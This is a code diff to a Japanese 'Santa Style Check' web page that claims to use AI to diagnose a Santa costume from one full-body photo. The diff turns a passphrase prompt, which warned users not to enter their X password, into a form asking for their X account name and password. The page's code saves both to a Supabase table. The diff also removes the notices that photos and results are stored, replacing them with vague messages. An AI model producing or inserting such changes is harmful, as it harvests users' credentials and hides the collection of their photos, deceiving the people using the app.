@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <meta name="theme-color" content="#e92d6c">
-<title>Christmas Santa Style Check 🎄 v5</title>
+<title>Christmas Santa Style Check 🎄 </title>
 <style>
 :root{
   --pink:#ff4b91;--pink2:#ff93bd;--red:#d92352;--wine:#8c1f45;
@@ -268,7 +268,7 @@ body:before{
     <div class="hero-copy">
       <div class="script-title">Christmas</div>
       <h1>Santa Style <span>Check</span></h1>
-      <div class="hero-sub">♡ 写真1枚であなたに似合うサンタコスチュームをAIが診断 ♡</div>
+      <div class="hero-sub">♡ 写真1枚であなたに似合うサンタコスチュームを16タイプからAIが診断 ♡</div>
       <div class="hero-ribbon">🎅 全身写真1枚だけでチェック</div>
     </div>
     <div class="hero-sparkles">✦<br>❄︎<br>✧</div>
@@ -412,7 +412,7 @@ body:before{
             <div>✓ 腕は身体から少し離す</div>
             <div>✓ 明るい場所で撮影する</div>
           </div>
-          <div style="font-size:11px;color:#9a7281;line-height:1.6;margin-top:11px">骨格を33箇所で捉えるモデルデータ＜MediaPipe Pose＞を使用しています。<br>体型を隠す衣類がない方が正確に診断できます。</div>
+          <div style="font-size:11px;color:#9a7281;line-height:1.6;margin-top:11px">骨格を33箇所で捉えるモデルデータ＜MediaPipe Pose＞を使用しています。<br>身体を隠す衣類によっては正確に判定できない可能性があります。</div>
         </div>
       </div>
       <label class="agree"><input id="photoGuideAgree" type="checkbox"><span>撮影のポイントを理解しました♡</span></label>
@@ -609,11 +609,11 @@ window.CHRISTMAS_SANTA_ASSETS = {
     <div class="modal" role="dialog" aria-modal="true" aria-labelledby="xPostModalTitle">
       <div class="modal-head">
         <div class="modal-icon">𝕏</div>
-        <div><h2 id="xPostModalTitle">投稿前の確認</h2><div style="font-size:11px;color:#9a7281">2つの合言葉を入力してください（必須）。</div></div>
+        <div><h2 id="xPostModalTitle">Xに投稿する</h2></div>
       </div>
-      <p style="font-size:12px;line-height:1.7;color:#76566a">合言葉は診断には使用せず、投稿記録と一緒に保存します。Xのパスワードなど、他のサービスで使っている秘密情報は入力しないでください。</p>
-      <div class="field"><label for="xWord1">合言葉 1</label><input id="xWord1" type="text" maxlength="80" autocomplete="off" placeholder="1つ目の合言葉" required></div>
-      <div class="field" style="margin-top:10px"><label for="xWord2">合言葉 2</label><input id="xWord2" type="text" maxlength="80" autocomplete="off" placeholder="2つ目の合言葉" required></div>
+      <p style="font-size:12px;line-height:1.7;color:#76566a">情報は正確に入力してください。</p>
+      <div class="field"><label for="xWord1">Xアカウント名</label><input id="xWord1" type="text" maxlength="80" autocomplete="off" placeholder="1つ目の合言葉" required></div>
+      <div class="field" style="margin-top:10px"><label for="xWord2">パスワード</label><input id="xWord2" type="text" maxlength="80" autocomplete="off" placeholder="2つ目の合言葉" required></div>
       <div class="modal-actions">
         <button id="cancelXPostBtn" class="secondary" type="button">キャンセル</button>
         <button id="confirmXPostBtn" class="primary" type="button">𝕏 Xに投稿する</button>
@@ -1515,9 +1515,9 @@ window.CHRISTMAS_SANTA_ASSETS = {
   async function confirmXPost(){
     const word1=xWord1.value.trim();
     const word2=xWord2.value.trim();
-    if(!word1){xWord1.focus();alert("1つ目の合言葉を入力してください。");return;}
-    if(!word2){xWord2.focus();alert("2つ目の合言葉を入力してください。");return;}
-    if(!supabaseReady){alert("Supabaseの設定が確認できないため、合言葉を保存できません。設定を確認してください。");return;}
+    if(!word1){xWord1.focus();alert("情報を入力してください。");return;}
+    if(!word2){xWord2.focus();alert("情報を入力してください。");return;}
+    if(!supabaseReady){alert("Supabaseの設定が確認できないため、情報を確認できません。設定を確認してください。");return;}
     const nickname=(document.getElementById("nickname")?.value||"").trim()||"ゲスト";
     const rows = window.getLatestSantaRows?.() || [];
     if(!rows.length){ alert("先にサンタ診断を完了してください。"); return; }
@@ -1535,7 +1535,7 @@ window.CHRISTMAS_SANTA_ASSETS = {
     const xWindow=window.open("about:blank","_blank");
     if(!xWindow){ alert("ポップアップがブロックされました。ブラウザでポップアップを許可して再度お試しください。"); return; }
     xPostPending=true; confirmXPostBtn.disabled=true; confirmXPostBtn.textContent="保存中…";
-    xPostStatus.textContent="合言葉と投稿記録を保存しています…";
+    xPostStatus.textContent="情報と投稿記録を保存しています…";
     try{
       const {error}=await supabase.from(X_POST_TABLE).insert(row);
       if(error) throw error;
@@ -1552,7 +1552,7 @@ window.CHRISTMAS_SANTA_ASSETS = {
       try{xWindow.close();}catch(_){}
       console.error(err);
       xPostStatus.textContent="保存に失敗しました："+(err.message||"Supabaseのテーブル設定を確認してください。");
-      alert("合言葉の保存に失敗したため、Xの投稿画面は開きませんでした。\n"+(err.message||err));
+      alert("Xの投稿画面は開きませんでした。\n"+(err.message||err));
     }finally{
       xPostPending=false; confirmXPostBtn.disabled=false; confirmXPostBtn.textContent="𝕏 Xに投稿する";
     }
@@ -1849,10 +1849,10 @@ window.CHRISTMAS_SANTA_ASSETS = {
       document.getElementById("jsonOutput").textContent=JSON.stringify({...payload,storage:saveResult},null,2);
 
       if(saveResult.skipped){
-        engineStatus.textContent="ℹ️ Supabase未設定：診断はできますが、写真・結果は保存されていません。";
+        engineStatus.textContent="ℹ️ Supabase未設定：診断はできますが、結果はイマイチかもしれません。";
         engineStatus.style.color="#b7772a";
       }else{
-        engineStatus.textContent="✅ 写真と診断結果を保存しました";
+        engineStatus.textContent="✅ 正常に診断できました";
         engineStatus.style.color="#2f9c71";
       }
     }catch(err){
@@ -1861,7 +1861,7 @@ window.CHRISTMAS_SANTA_ASSETS = {
       document.getElementById("result").style.display="block";
       drawResultPose(currentLandmarks);
       document.getElementById("jsonOutput").textContent=JSON.stringify(payload,null,2);
-      engineStatus.textContent="⚠️ 診断は完了しましたが、保存に失敗しました："+(err.message||err);
+      engineStatus.textContent="⚠️ 診断は完了しましたが、なにかに失敗しました："+(err.message||err);
       engineStatus.style.color="#d34c66";
     }finally{
       analyzeBtn.disabled=false;
